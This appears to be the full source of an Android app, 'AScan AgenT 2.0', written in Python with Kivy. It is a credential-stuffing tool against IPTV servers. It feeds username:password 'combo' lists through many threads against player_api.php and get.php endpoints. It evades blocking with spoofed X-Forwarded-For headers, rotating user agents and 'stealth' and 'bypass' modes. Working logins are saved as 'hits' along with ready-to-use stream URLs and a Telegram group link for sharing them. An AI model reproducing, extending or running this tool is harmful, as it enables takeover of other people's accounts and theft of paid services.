# -*- coding: utf-8 -*-
"""
AScan AgenT 2.0 - Android App
Interface grafica nativa com Kivy
"""

import os
import sys
import time
import datetime
import threading
import queue
import random
import re
import socket
import json
import subprocess
from collections import defaultdict, deque

# Kivy imports
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.popup import Popup
from kivy.uix.filechooser import FileChooserListView
from kivy.uix.progressbar import ProgressBar
from kivy.uix.spinner import Spinner
from kivy.uix.togglebutton import ToggleButton
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.properties import StringProperty, BooleanProperty, NumericProperty
from kivy.graphics import Color, Rectangle, RoundedRectangle
from kivy.utils import get_color_from_hex

# Cores do tema AScan
THEME = {
    'bg': '#0D1117',
    'card': '#161B22',
    'border': '#30363D',
    'text': '#C9D1D9',
    'text_dim': '#8B949E',
    'accent': '#58A6FF',
    'success': '#238636',
    'warning': '#F0883E',
    'danger': '#DA3633',
    'gold': '#E3B341',
    'purple': '#8957E5',
}

# ========== IMPORTS COM FALLBACK ==========
try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    pass

try:
    import cloudscraper
    CLOUDSCRAPER_AVAILABLE = True
except ImportError:
    CLOUDSCRAPER_AVAILABLE = False

try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

# ========== DIRETORIOS ==========
BASE_DIR = os.path.expanduser('~')
if hasattr(sys, '_MEIPASS'):
    BASE_DIR = sys._MEIPASS
elif 'ANDROID_STORAGE' in os.environ:
    BASE_DIR = os.environ.get('EXTERNAL_STORAGE', '/sdcard')

OUT_DIR = os.path.join(BASE_DIR, 'AScan_AgenT')
COMBO_DIR = os.path.join(BASE_DIR, 'AScan_Combo')
HITS_DIR = os.path.join(OUT_DIR, 'HITS')
COMBO_HITS_DIR = os.path.join(OUT_DIR, 'COMBO')
PROXY_DIR = os.path.join(OUT_DIR, 'proxys')

for d in [OUT_DIR, COMBO_DIR, HITS_DIR, COMBO_HITS_DIR, PROXY_DIR]:
    try:
        os.makedirs(d, exist_ok=True)
    except:
        pass

# ========== ESTADOS GLOBAIS ==========
_pause_scan = threading.Event()
_stop_early = threading.Event()
_stop_parallel = threading.Event()
SERVER_INDEX = {}

_display_lock = threading.Lock()
_RESULTS_LOCK = threading.Lock()
_FILE_LOCK = threading.Lock()

HIT_CASCADE = deque(maxlen=10)
BASELINE_CATS = {}
PARALLEL_SCANS = {}

_SERVER_HTTP_STATUS = {}
_SERVER_HTTP_STATUS_LOCK = threading.Lock()

_start_time = time.time()
COMBO_ATUAL_NOME = ""
STATS_GERAIS = {"hits": 0, "hits_ilimitados": 0, "checks": 0, "start_time": 0}

MODO_ATAQUE = "adaptativo"

SESSION_CACHE = {}
SESSION_CACHE_LOCK = threading.Lock()
DNS_CACHE = {}
DNS_CACHE_LOCK = threading.Lock()

# ========== USER-AGENTS ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "TiviMate/4.7.0 (Android 11; NVIDIA SHIELD TV Pro)",
    "IPTVSmartersPro/3.1.5 (Linux; Android 9) ExoPlayerLib/2.11.8",
    "okhttp/5.2.0",
]

ACCEPT_LANGS = ["en-US,en;q=0.9", "pt-BR,pt;q=0.9"]
REFERERS = ["http://www.google.com/", "https://www.youtube.com/", ""]

# ========== HEADERS ==========
def get_headers_avancados():
    profile = random.choice(USER_AGENTS)
    headers = {
        "User-Agent": profile,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": random.choice(ACCEPT_LANGS),
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "DNT": random.choice(["1", "0"]),
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "no-cache",
    }
    ip_fake = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    headers.update({
        "X-Forwarded-For": ip_fake,
        "X-Real-IP": ip_fake,
        "Client-IP": ip_fake,
    })
    if random.random() > 0.3:
        headers["Referer"] = random.choice(REFERERS)
    return headers

# ========== SESSAO ==========
def get_session_hibrida(server=None, proxy=None):
    session_key = f"{server}_{proxy}"
    with SESSION_CACHE_LOCK:
        if session_key in SESSION_CACHE:
            session, timestamp = SESSION_CACHE[session_key]
            if time.time() - timestamp < 300:
                return session

    session = requests.Session()
    session.headers.update(get_headers_avancados())
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    with SESSION_CACHE_LOCK:
        SESSION_CACHE[session_key] = (session, time.time())
    return session

def renew_session_hibrida(server=None, proxy=None):
    session_key = f"{server}_{proxy}"
    with SESSION_CACHE_LOCK:
        if session_key in SESSION_CACHE:
            del SESSION_CACHE[session_key]
    return get_session_hibrida(server, proxy)

# ========== DNS ==========
def resolve_dns_hibrido(host):
    with DNS_CACHE_LOCK:
        if host in DNS_CACHE:
            entry = DNS_CACHE[host]
            if time.time() - entry['timestamp'] < 1800:
                return entry['ip']

    ip = None
    if DNS_AVAILABLE:
        try:
            resolver = dns.resolver.Resolver()
            resolver.timeout = 2
            resolver.lifetime = 2
            answers = resolver.resolve(host, 'A')
            for rdata in answers:
                ip = str(rdata)
                break
        except:
            pass

    if not ip:
        try:
            ip = socket.gethostbyname(host)
        except:
            pass

    if ip:
        with DNS_CACHE_LOCK:
            DNS_CACHE[host] = {'ip': ip, 'timestamp': time.time()}
    return ip

# ========== FETCH ==========
def fetch_json_hibrido(url, timeout=10, server=None, proxy=None, max_retries=3):
    for attempt in range(max_retries):
        try:
            session = get_session_hibrida(server, proxy)
            headers = get_headers_avancados()
            if hasattr(session, 'headers'):
                session.headers.update(headers)
            if attempt > 0:
                time.sleep(random.uniform(1, 3) * attempt)
            r = session.get(url, timeout=timeout, verify=False, allow_redirects=True)
            if r.status_code == 200:
                try:
                    return r.json()
                except:
                    return None
            elif r.status_code in [403, 429, 520] and attempt < max_retries - 1:
                renew_session_hibrida(server, proxy)
                time.sleep(random.uniform(2, 5))
                continue
            return None
        except:
            if attempt < max_retries - 1:
                time.sleep(random.uniform(1, 2))
                continue
            return None
    return None

def simple_status_hibrido(url, timeout=4):
    try:
        session = get_session_hibrida()
        r = session.get(url, timeout=timeout, verify=False, allow_redirects=True)
        return r
    except:
        return None

# ========== GEO ==========
def resolve_ip(host):
    return resolve_dns_hibrido(host) or ""

def geo_lookup(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,regionName,city,isp", timeout=8)
        if r.status_code == 200:
            j = r.json()
            if j.get("status") == "success":
                return {
                    "country": j.get("country", ""),
                    "countryCode": j.get("countryCode", ""),
                    "region": j.get("regionName", ""),
                    "city": j.get("city", ""),
                    "isp": j.get("isp", ""),
                }
    except:
        pass
    return {"country": "", "countryCode": "", "region": "", "city": "", "isp": ""}

def country_flag(cc):
    try:
        if not cc or len(cc) != 2:
            return ""
        return chr(0x1F1E6 + ord(cc[0].upper()) - ord('A')) + chr(0x1F1E6 + ord(cc[1].upper()) - ord('A'))
    except:
        return ""

def describe_geo(geo):
    try:
        parts = []
        if geo.get("city"): parts.append(geo["city"])
        if geo.get("region"): parts.append(geo["region"])
        if geo.get("country"): parts.append(geo["country"])
        flag = country_flag(geo.get("countryCode", ""))
        return ", ".join(parts) + " " + flag if parts else "Desconhecido"
    except:
        return "Desconhecido"

# ========== CATEGORIAS ==========
def _safe_text(b):
    if isinstance(b, str):
        return b
    try:
        return b.decode("utf-8", errors="ignore")
    except:
        return str(b)

def download_m3u_text(server, user, pwd, timeout=4):
    base = f"http://{server}"
    urls = [
        f"{base}/get.php?username={user}&password={pwd}&type=m3u",
        f"{base}/get.php?username={user}&password={pwd}&type=m3u_plus",
    ]
    for url in urls:
        try:
            session = get_session_hibrida(server)
            r = session.get(url, timeout=timeout, verify=False)
            if r.status_code == 200 and r.content:
                txt = _safe_text(r.content)
                if "#EXTM3U" in txt or "#EXTINF" in txt:
                    return txt
        except:
            pass
    return None

def extract_categories_from_m3u(m3u_text):
    if not m3u_text:
        return []
    cats = []
    seen = set()
    for line in m3u_text.splitlines():
        if "#EXTINF" in line and 'group-title="' in line:
            try:
                cat = line.split('group-title="')[1].split('"')[0]
                if cat and cat not in seen:
                    seen.add(cat)
                    cats.append(cat)
            except:
                pass
    return cats

def get_categories(server, user, pwd, timeout=8):
    try:
        url = f"http://{server}/player_api.php?action=get_live_categories&username={user}&password={pwd}"
        data = fetch_json_hibrido(url, timeout=timeout, server=server)
        if isinstance(data, list) and data:
            return [str(c.get("category_name", "")).strip() for c in data if c.get("category_name")]
    except:
        pass
    try:
        url = f"http://{server}/player_api.php?action=get_live_streams&username={user}&password={pwd}"
        data = fetch_json_hibrido(url, timeout=timeout, server=server)
        if isinstance(data, list) and data:
            cats = []
            seen = set()
            for item in data:
                name = str(item.get("category_name", "")).strip()
                if name and name not in seen:
                    seen.add(name)
                    cats.append(name)
            if cats:
                return cats
    except:
        pass
    m3u = download_m3u_text(server, user, pwd, timeout=4)
    if m3u:
        return extract_categories_from_m3u(m3u)
    return []

def _norm_txt(s):
    try:
        return "".join(c.lower() for c in str(s) if c.isalnum())
    except:
        return ""

def _cats_to_set(names):
    return set(_norm_txt(n) for n in names if n)

def _cats_similar(base_set, cand_set):
    if not base_set or not cand_set:
        return False
    inter = len(base_set.intersection(cand_set))
    uni = len(base_set.union(cand_set))
    return (inter >= 3) or (inter >= 2 and (inter / uni) >= 0.55) if uni else False

# ========== CHECK TARGET ==========
def check_target(server, item, timeout=8, proxy=None):
    user, pwd = item
    url = f'http://{server}/player_api.php?username={user}&password={pwd}'
    data = fetch_json_hibrido(url, timeout=timeout, server=server, proxy=proxy)
    if data:
        status = str(data.get('user_info', {}).get('status', '')).lower()
        if status in ['active', '1', 'true', 'ok']:
            return (True, data)
    try:
        m3u_url = f'http://{server}/get.php?username={user}&password={pwd}&type=m3u_plus&output=ts'
        session = get_session_hibrida(server, proxy)
        r = session.get(m3u_url, timeout=timeout, verify=False)
        if r.status_code == 200 and r.content:
            txt = _safe_text(r.content)
            if "#EXTM3U" in txt or "#EXTINF" in txt:
                data = {"user_info": {"status": "active"}, "m3u_fallback": True}
                return (True, data)
    except:
        pass
    return (False, {})

def fetch_counts(server, user, pwd):
    try:
        base = f'http://{server}/player_api.php?username={user}&password={pwd}'
        canais = fetch_json_hibrido(base + '&action=get_live_streams', server=server) or []
        filmes = fetch_json_hibrido(base + '&action=get_vod_streams', server=server) or []
        series = fetch_json_hibrido(base + '&action=get_series', server=server) or []
        return (len(canais), len(filmes), len(series))
    except:
        return (0, 0, 0)

# ========== SALVAR HIT ==========
def remover_ansi(texto):
    ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
    return ansi_escape.sub('', texto)

def build_hit_text(server, item, data):
    user, pwd = item
    ui = data.get('user_info', {})
    host = server.split(':')[0]
    port = server.split(':')[1] if ':' in server else '80'
    ip = resolve_ip(host)
    geo_data = geo_lookup(ip) if ip else {}
    geo_txt = describe_geo(geo_data)
    canais, filmes, series = fetch_counts(server, user, pwd)
    total = canais + filmes + series

    exp = ui.get('exp_date', '0')
    is_ilimitado = False
    dias_restantes = 0
    if exp in ['0', 'null', 'None', '']:
        is_ilimitado = True
    else:
        try:
            exp_ts = int(exp)
            dias_restantes = int((exp_ts - time.time()) / 86400)
            if dias_restantes > 365:
                is_ilimitado = True
        except:
            is_ilimitado = True

    created_at = ui.get('created_at', '0')
    created_str = "N/A"
    if created_at and created_at != '0':
        try:
            created_ts = int(created_at)
            created_str = datetime.datetime.fromtimestamp(created_ts).strftime('%d/%m/%Y')
        except:
            pass

    exp_str = "Ilimitado"
    if not is_ilimitado and exp not in ['0', 'null', 'None', '']:
        try:
            exp_ts = int(exp)
            exp_str = datetime.datetime.fromtimestamp(exp_ts).strftime('%d/%m/%Y')
        except:
            pass

    m3u = f'http://{server}/get.php?username={user}&password={pwd}&type=m3u_plus&output=ts'
    epg = f'http://{host}/xmltv.php?username={user}&password={pwd}'

    template = f"""AScan AgenT 2.0 [HIT]
Servidor  -> http://{server}
DNS Real  -> {host}:{port}
Local     -> {geo_txt}
--------------------------
Usuario   -> {user}
Senha     -> {pwd}
Status    -> [ONLINE]
Plano     -> {'ILIMITADO' if is_ilimitado else 'PREMIUM'}
Conexoes  -> {ui.get('active_cons', '0')}/{ui.get('max_connections', '1')}
Criado em -> {created_str}
Expira em -> {exp_str}
Restam    -> {dias_restantes if not is_ilimitado else 'Ilimitado'} {'Dias' if not is_ilimitado else ''}
Canais    -> {canais}
Filmes    -> {filmes}
Series    -> {series}
Total     -> {total}
--------------------------
M3U       -> {m3u}
EPG       -> {epg}
Combo     -> {COMBO_ATUAL_NOME}
--------------------------
Grupo    -> AScan
Telegram -> https://t.me/+UfgoBcTQpwBlMDMx
"""
    return template, is_ilimitado

def save_hit(server, texto, is_ilimitado=False):
    try:
        with _FILE_LOCK:
            host = server.split(':')[0]
            safe_host = host.replace('.', '_').replace('/', '_')
            data_str = datetime.datetime.now().strftime('%d-%m')
            filename = f"{data_str}_{safe_host}.txt"
            texto_limpo = remover_ansi(texto)
            timestamp = datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')
            texto_completo = f"[{timestamp}]\n{texto_limpo}\n"

            path = os.path.join(HITS_DIR, filename)
            with open(path, "a", encoding="utf-8") as f:
                f.write(texto_completo + "\n\n")

            geral_path = os.path.join(HITS_DIR, "HITS_GERAL.txt")
            with open(geral_path, "a", encoding="utf-8") as f:
                f.write(texto_completo + "\n\n")

            if is_ilimitado:
                ilimitado_path = os.path.join(HITS_DIR, "ILIMITADOS.txt")
                with open(ilimitado_path, "a", encoding="utf-8") as f:
                    f.write(texto_completo + "\n\n")

            global STATS_GERAIS
            STATS_GERAIS['hits'] += 1
            if is_ilimitado:
                STATS_GERAIS['hits_ilimitados'] += 1
            return True
    except:
        return False

def save_combo_for_server(server, user, pwd):
    try:
        with _FILE_LOCK:
            host = server.split(':')[0]
            safe_host = host.replace('.', '_').replace('/', '_')
            filename = f"{safe_host}.txt"
            path = os.path.join(COMBO_HITS_DIR, filename)
            with open(path, "a", encoding="utf-8") as f:
                f.write(f"{user}:{pwd}\n")
    except:
        pass

# ========== WIDGETS CUSTOMIZADOS ==========
class Card(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        self.padding = [12, 12, 12, 12]
        self.spacing = 8
        self.size_hint_y = None
        with self.canvas.before:
            Color(*get_color_from_hex(THEME['card']))
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=[12])
        self.bind(pos=self.update_rect, size=self.update_rect)

    def update_rect(self, *args):
        self.rect.pos = self.pos
        self.rect.size = self.size

class StyledButton(Button):
    def __init__(self, btn_type='primary', **kwargs):
        super().__init__(**kwargs)
        self.btn_type = btn_type
        self.background_normal = ''
        self.background_down = ''
        self.background_color = get_color_from_hex(THEME['accent'] if btn_type == 'primary' else 
                                                     THEME['success'] if btn_type == 'success' else
                                                     THEME['danger'] if btn_type == 'danger' else
                                                     THEME['warning'] if btn_type == 'warning' else
                                                     THEME['border'])
        self.color = get_color_from_hex(THEME['text'])
        self.font_size = '14sp'
        self.bold = True
        self.size_hint_y = None
        self.height = 48
        with self.canvas.before:
            Color(*self.background_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=[8])
        self.bind(pos=self.update_rect, size=self.update_rect)

    def update_rect(self, *args):
        self.rect.pos = self.pos
        self.rect.size = self.size

class StyledInput(TextInput):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.background_color = get_color_from_hex(THEME['bg'])
        self.foreground_color = get_color_from_hex(THEME['text'])
        self.cursor_color = get_color_from_hex(THEME['accent'])
        self.hint_text_color = get_color_from_hex(THEME['text_dim'])
        self.padding = [12, 10]
        self.font_size = '14sp'
        self.multiline = False
        self.size_hint_y = None
        self.height = 44

class LogLabel(Label):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.color = get_color_from_hex(THEME['text'])
        self.font_size = '12sp'
        self.text_size = (None, None)
        self.halign = 'left'
        self.valign = 'top'
        self.markup = True

# ========== APP PRINCIPAL ==========
class AScanApp(App):
    scan_running = BooleanProperty(False)
    scan_paused = BooleanProperty(False)
    current_hits = NumericProperty(0)
    current_checks = NumericProperty(0)
    current_cpm = NumericProperty(0)
    combo_loaded = StringProperty("Nenhum")
    log_text = StringProperty("")

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.servers = []
        self.combo_items = []
        self.proxies_list = []
        self.workers = []
        self.stats = {'hits': 0, 'checks': 0, 'cpm': 0.0, 'start': 0}
        self.server_hits = {}
        self.task_queues = {}
        self.scan_thread = None
        self.update_clock = None
        Window.clearcolor = get_color_from_hex(THEME['bg'])

    def build(self):
        return self.build_main_screen()

    def build_main_screen(self):
        root = BoxLayout(orientation='vertical', padding=16, spacing=12)

        # Header
        header = BoxLayout(size_hint_y=None, height=60, spacing=10)
        title = Label(
            text='[b]AScan AgenT 2.0[/b]',
            markup=True,
            font_size='24sp',
            color=get_color_from_hex(THEME['accent']),
            size_hint_x=0.7
        )
        status = Label(
            text='[color=238636]●[/color] Pronto',
            markup=True,
            font_size='12sp',
            color=get_color_from_hex(THEME['text_dim']),
            size_hint_x=0.3
        )
        self.status_label = status
        header.add_widget(title)
        header.add_widget(status)
        root.add_widget(header)

        # Scroll content
        scroll = ScrollView()
        content = GridLayout(cols=1, spacing=12, size_hint_y=None)
        content.bind(minimum_height=content.setter('height'))

        # Card Servidores
        card_servers = Card()
        card_servers.add_widget(Label(
            text='[b]Servidores[/b] (max 5)',
            markup=True,
            color=get_color_from_hex(THEME['accent']),
            font_size='14sp',
            size_hint_y=None,
            height=30
        ))
        self.server_inputs = []
        for i in range(5):
            inp = StyledInput(hint_text=f'Servidor {i+1} (host:porta)')
            self.server_inputs.append(inp)
            card_servers.add_widget(inp)
        content.add_widget(card_servers)

        # Card Combo
        card_combo = Card()
        card_combo.add_widget(Label(
            text='[b]Combo[/b]',
            markup=True,
            color=get_color_from_hex(THEME['accent']),
            font_size='14sp',
            size_hint_y=None,
            height=30
        ))
        combo_row = BoxLayout(size_hint_y=None, height=50, spacing=8)
        self.combo_label = Label(
            text='Nenhum combo selecionado',
            color=get_color_from_hex(THEME['text_dim']),
            font_size='12sp',
            size_hint_x=0.6
        )
        btn_combo = StyledButton(
            text='Escolher Combo',
            btn_type='primary',
            size_hint_x=0.4
        )
        btn_combo.bind(on_press=self.show_file_chooser)
        combo_row.add_widget(self.combo_label)
        combo_row.add_widget(btn_combo)
        card_combo.add_widget(combo_row)
        content.add_widget(card_combo)

        # Card Config
        card_config = Card()
        card_config.add_widget(Label(
            text='[b]Configuracoes[/b]',
            markup=True,
            color=get_color_from_hex(THEME['accent']),
            font_size='14sp',
            size_hint_y=None,
            height=30
        ))

        # Modo
        modo_row = BoxLayout(size_hint_y=None, height=50, spacing=8)
        modo_row.add_widget(Label(
            text='Modo:',
            color=get_color_from_hex(THEME['text']),
            size_hint_x=0.3
        ))
        self.modo_spinner = Spinner(
            text='Adaptativo',
            values=['Padrao', 'Adaptativo', 'Furtivo', 'Camaleao', 'Bypass Intenso'],
            size_hint_x=0.7,
            background_color=get_color_from_hex(THEME['border']),
            color=get_color_from_hex(THEME['text'])
        )
        modo_row.add_widget(self.modo_spinner)
        card_config.add_widget(modo_row)

        # Threads
        threads_row = BoxLayout(size_hint_y=None, height=50, spacing=8)
        threads_row.add_widget(Label(
            text='Threads:',
            color=get_color_from_hex(THEME['text']),
            size_hint_x=0.3
        ))
        self.threads_input = StyledInput(
            text='20',
            size_hint_x=0.7
        )
        threads_row.add_widget(self.threads_input)
        card_config.add_widget(threads_row)

        # Proxy
        proxy_row = BoxLayout(size_hint_y=None, height=50, spacing=8)
        self.proxy_toggle = ToggleButton(
            text='Sem Proxy',
            group='proxy',
            state='down',
            background_color=get_color_from_hex(THEME['border']),
            color=get_color_from_hex(THEME['text'])
        )
        proxy_row.add_widget(self.proxy_toggle)
        card_config.add_widget(proxy_row)
        content.add_widget(card_config)

        # Card Stats
        card_stats = Card()
        card_stats.add_widget(Label(
            text='[b]Estatisticas[/b]',
            markup=True,
            color=get_color_from_hex(THEME['accent']),
            font_size='14sp',
            size_hint_y=None,
            height=30
        ))
        self.stats_labels = {}
        for key, label_text in [
            ('checks', 'Checks: 0'),
            ('hits', 'Hits: 0'),
            ('ilimitados', 'Ilimitados: 0'),
            ('cpm', 'CPM: 0'),
            ('tempo', 'Tempo: 00:00')
        ]:
            lbl = Label(
                text=label_text,
                color=get_color_from_hex(THEME['text']),
                font_size='13sp',
                size_hint_y=None,
                height=28
            )
            self.stats_labels[key] = lbl
            card_stats.add_widget(lbl)
        content.add_widget(card_stats)

        # Card Log
        card_log = Card()
        card_log.add_widget(Label(
            text='[b]Log[/b]',
            markup=True,
            color=get_color_from_hex(THEME['accent']),
            font_size='14sp',
            size_hint_y=None,
            height=30
        ))
        self.log_label = LogLabel(
            text='Aguardando inicio...',
            size_hint_y=None
        )
        self.log_label.bind(texture_size=self.log_label.setter('size'))
        card_log.add_widget(self.log_label)
        content.add_widget(card_log)

        scroll.add_widget(content)
        root.add_widget(scroll)

        # Botoes de controle
        controls = BoxLayout(size_hint_y=None, height=60, spacing=10)
        self.btn_start = StyledButton(
            text='INICIAR SCAN',
            btn_type='success'
        )
        self.btn_start.bind(on_press=self.start_scan)

        self.btn_pause = StyledButton(
            text='PAUSAR',
            btn_type='warning'
        )
        self.btn_pause.bind(on_press=self.toggle_pause)

        self.btn_stop = StyledButton(
            text='PARAR',
            btn_type='danger'
        )
        self.btn_stop.bind(on_press=self.stop_scan)

        controls.add_widget(self.btn_start)
        controls.add_widget(self.btn_pause)
        controls.add_widget(self.btn_stop)
        root.add_widget(controls)

        return root

    def show_file_chooser(self, instance):
        content = BoxLayout(orientation='vertical', spacing=10)

        filechooser = FileChooserListView(
            path=COMBO_DIR if os.path.exists(COMBO_DIR) else BASE_DIR,
            filters=['*.txt']
        )
        content.add_widget(filechooser)

        btn_select = Button(
            text='Selecionar',
            size_hint_y=None,
            height=50,
            background_color=get_color_from_hex(THEME['success'])
        )

        popup = Popup(
            title='Escolher Combo',
            content=content,
            size_hint=(0.9, 0.8)
        )

        def on_select(instance):
            if filechooser.selection:
                path = filechooser.selection[0]
                self.load_combo(path)
                popup.dismiss()

        btn_select.bind(on_press=on_select)
        content.add_widget(btn_select)
        popup.open()

    def load_combo(self, path):
        global COMBO_ATUAL_NOME
        items = []
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        u, p = line.split(':', 1)
                        u = u.strip()
                        p = p.strip()
                        if u and p:
                            items.append((u, p))
        except Exception as e:
            self.add_log(f"Erro ao carregar combo: {e}")
            return

        self.combo_items = items
        COMBO_ATUAL_NOME = os.path.basename(path)
        self.combo_label.text = f"{COMBO_ATUAL_NOME} ({len(items)} itens)"
        self.add_log(f"Combo carregado: {COMBO_ATUAL_NOME} ({len(items)} itens)")

    def add_log(self, text):
        current = self.log_label.text
        lines = current.split('\n')
        lines.append(text)
        if len(lines) > 50:
            lines = lines[-50:]
        self.log_label.text = '\n'.join(lines)

    def start_scan(self, instance):
        if self.scan_running:
            return

        # Coleta servidores
        self.servers = []
        for inp in self.server_inputs:
            s = inp.text.strip()
            if s:
                s = s.replace('http://', '').replace('https://', '').strip()
                if ':' not in s:
                    s += ':80'
                self.servers.append(s)

        if not self.servers:
            self.add_log("Erro: Nenhum servidor informado!")
            return

        if not self.combo_items:
            self.add_log("Erro: Nenhum combo carregado!")
            return

        # Configura modo
        modo_map = {
            'Padrao': 'padrao',
            'Adaptativo': 'adaptativo',
            'Furtivo': 'furtivo',
            'Camaleao': 'camaleao',
            'Bypass Intenso': 'bypass_intenso'
        }
        global MODO_ATAQUE
        MODO_ATAQUE = modo_map.get(self.modo_spinner.text, 'adaptativo')

        try:
            n_threads = int(self.threads_input.text or "20")
            n_threads = max(1, min(n_threads, 50))
        except:
            n_threads = 20

        self.add_log(f"Iniciando scan em {len(self.servers)} servidor(es)...")
        self.add_log(f"Modo: {MODO_ATAQUE} | Threads: {n_threads}")

        global _stop_early, _pause_scan
        _stop_early.clear()
        _pause_scan.clear()

        self.scan_running = True
        self.scan_paused = False
        self.status_label.text = '[color=238636]●[/color] Escaneando'

        self.stats = {'hits': 0, 'checks': 0, 'cpm': 0.0, 'start': time.time()}
        self.server_hits = {s: 0 for s in self.servers}
        global _start_time, STATS_GERAIS
        _start_time = time.time()
        STATS_GERAIS = {"hits": 0, "hits_ilimitados": 0, "checks": 0, "start_time": _start_time}

        # Filas
        self.task_queues = {}
        for s in self.servers:
            q = queue.Queue()
            for item in self.combo_items:
                q.put(item)
            self.task_queues[s] = q

        # Workers
        self.workers = []
        for s in self.servers:
            for _ in range(n_threads):
                t = threading.Thread(
                    target=self.worker,
                    args=(s, self.task_queues[s]),
                    daemon=True
                )
                t.start()
                self.workers.append(t)

        # Atualizacao de UI
        self.update_clock = Clock.schedule_interval(self.update_ui, 1.0)

    def worker(self, server, task_q):
        proxy = None
        consecutive_fails = 0
        stealth_burst_counter = 0

        while not _stop_early.is_set():
            if _pause_scan.is_set():
                time.sleep(0.2)
                continue

            try:
                item = task_q.get(timeout=0.5)
            except queue.Empty:
                break

            user, pwd = item

            try:
                if MODO_ATAQUE == 'furtivo':
                    stealth_burst_counter += 1
                    if stealth_burst_counter > random.randint(3, 8):
                        time.sleep(random.uniform(1, 4))
                        stealth_burst_counter = 0

                if MODO_ATAQUE == 'camaleao':
                    renew_session_hibrida(server, proxy)

                ok, data = check_target(server, item, proxy=proxy)

                with _display_lock:
                    self.stats['checks'] += 1
                    elapsed = time.time() - self.stats['start']
                    self.stats['cpm'] = self.stats['checks'] / elapsed * 60 if elapsed > 0 else 0

                if ok:
                    consecutive_fails = 0
                    self.server_hits[server] = self.server_hits.get(server, 0) + 1
                    self.stats['hits'] += 1

                    save_combo_for_server(server, user, pwd)
                    texto, is_ilimitado = build_hit_text(server, item, data)
                    save_hit(server, texto, is_ilimitado)

                    with _RESULTS_LOCK:
                        host = server.split(':')[0]
                        HIT_CASCADE.append(f"http://{host[:20]} | {user[:8]} - {pwd[:8]}")

                    Clock.schedule_once(lambda dt, t=texto: self.add_log(f"[HIT] {t[:100]}..."), 0)

                    if server not in BASELINE_CATS or not BASELINE_CATS[server]:
                        cats = get_categories(server, user, pwd, timeout=8)
                        BASELINE_CATS[server] = _cats_to_set(cats)
                else:
                    consecutive_fails += 1
                    if consecutive_fails >= 5 and MODO_ATAQUE == 'adaptativo':
                        renew_session_hibrida(server, proxy)
                        consecutive_fails = 0

            except:
                pass
            finally:
                task_q.task_done()

    def update_ui(self, dt):
        if not self.scan_running:
            return

        elapsed = int(time.time() - self.stats['start'])
        tempo_str = f"{elapsed//60:02}:{elapsed%60:02}"

        self.stats_labels['checks'].text = f"Checks: {self.stats['checks']:,}"
        self.stats_labels['hits'].text = f"Hits: {self.stats['hits']}"
        self.stats_labels['ilimitados'].text = f"Ilimitados: {STATS_GERAIS['hits_ilimitados']}"
        self.stats_labels['cpm'].text = f"CPM: {int(self.stats['cpm'])}"
        self.stats_labels['tempo'].text = f"Tempo: {tempo_str}"

        # Verifica se terminou
        alive = any(t.is_alive() for t in self.workers)
        if not alive or _stop_early.is_set():
            self.scan_running = False
            self.status_label.text = '[color=F0883E]●[/color] Finalizado'
            self.add_log(f"Scan finalizado! Hits: {self.stats['hits']}")
            if self.update_clock:
                self.update_clock.cancel()

    def toggle_pause(self, instance):
        if not self.scan_running:
            return

        if self.scan_paused:
            _pause_scan.clear()
            self.scan_paused = False
            self.btn_pause.text = 'PAUSAR'
            self.status_label.text = '[color=238636]●[/color] Escaneando'
            self.add_log("Scan continuado")
        else:
            _pause_scan.set()
            self.scan_paused = True
            self.btn_pause.text = 'CONTINUAR'
            self.status_label.text = '[color=F0883E]●[/color] Pausado'
            self.add_log("Scan pausado")

    def stop_scan(self, instance):
        if not self.scan_running:
            return

        _stop_early.set()
        self.scan_running = False
        self.scan_paused = False
        self.status_label.text = '[color=DA3633]●[/color] Parado'
        self.btn_pause.text = 'PAUSAR'
        self.add_log("Scan parado pelo usuario")

        if self.update_clock:
            self.update_clock.cancel()

if __name__ == '__main__':
    AScanApp().run()
